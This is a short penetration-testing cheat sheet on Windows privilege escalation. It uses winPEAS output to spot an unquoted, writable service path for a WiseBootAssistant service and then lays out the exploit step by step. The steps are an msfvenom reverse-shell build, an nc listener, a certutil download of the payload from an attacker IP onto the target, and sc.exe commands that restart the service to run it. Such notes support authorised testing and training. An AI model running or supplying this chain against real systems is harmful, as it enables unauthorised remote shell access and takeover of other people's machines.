---
title: WINPEAS
summary: A Windows local Privilege Escalation Awesome Script.
description: A Windows local Privilege Escalation Awesome Script.
---

**[https://github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng)**

## WINPEAS Basis

**https://github.com/carlospolop/PEASS-ng/releases**

 > 
 > **<font color=red>winPEASx64.exe</font>**
 > Run WinPEAD

## WINPEAS No quotes and Space detected

#### WINPEAS Output

````
WiseBootAssistant(WiseCleaner.com - Wise Boot Assistant)[C:\Program Files (x86)\Wise\Wise Care 365\BootTime.exe] - Auto - Running - No quotes and Space detected YOU CAN MODIFY THIS SERVICE: AllAccess
````

#### On attacker machine

 > 
 > **<font color=red>msfvenom -p windows/x64/shell_reverse_tcp LHOST=</font>\[ATTACKER_IP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\] -f <font color=red>exe -o</font> Wise.exe**</br>
 > Create a reverse shell with the name of the modifiable service.
 > 
 > **<font color=red>nc -lvnp</font> \[ATTACKER_PORT\]**</br>
 > Open a listener.

#### On target machine

 > 
 > **<font color=red>cd "C:\\Program Files (x86)\\</font>Wise"**</br>
 > **<font color=red>certutil.exe -urlcache -f</font> http://\[ATTACKER_IP\]:\[ATTACKER_PORT\]/Wise.exe Wise.exe**</br>
 > Download crafted executable and place it where the space is in the vulnerable path.
 > 
 > **<font color=red>sc.exe stop</font> WiseBootAssistant**</br>
 > **<font color=red>sc.exe query</font> WiseBootAssistant**</br>
 > **<font color=red>sc.exe start</font> WiseBootAssistant**</br>
 > Restart the service to execute the crafted one. 
